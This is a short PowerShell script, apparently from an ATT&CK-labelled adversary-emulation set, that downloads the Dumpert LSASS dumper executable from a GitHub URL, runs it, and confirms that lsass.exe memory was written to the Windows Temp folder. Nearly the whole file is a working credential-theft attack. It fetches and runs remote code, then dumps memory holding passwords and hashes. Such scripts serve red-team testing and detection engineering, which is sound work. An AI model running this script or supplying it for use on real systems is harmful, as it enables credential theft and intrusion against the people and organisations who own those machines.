<#
    T1003.001 - OS Credential Dumping: LSASS Memory
    T1204.002 - User Execution: Malicious File
    T1588.001 - Obtain Capabilities: Malware
    Dump lsass with dumpert.exe (LSASS memory dumper using direct system calls and API unhooking)
    Download dumpert.exe from forked project https://github.com/mthcht/Dumpert/raw/exe/EXE/Outflank-Dumpert.exe and execute it 
#>

# Download and execute Outflank-Dumpert.exe
$url = "https://github.com/mthcht/Dumpert/raw/exe/EXE/Outflank-Dumpert.exe"
$dumpfile = "$env:windir\Temp\dumpert.dmp"
$outfile = "$env:tmp\dmpert.exe"
try {
    Invoke-WebRequest $url -OutFile $outfile 
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: Dumpert downloaded to $outfile"
        & $outfile
    }
    else{
        throw "dmpert.exe not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Dumped lsass.exe memory to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to Dump lsass.exe memory to $dumpfile"
    }
}
catch {
    Write-Error $_
}
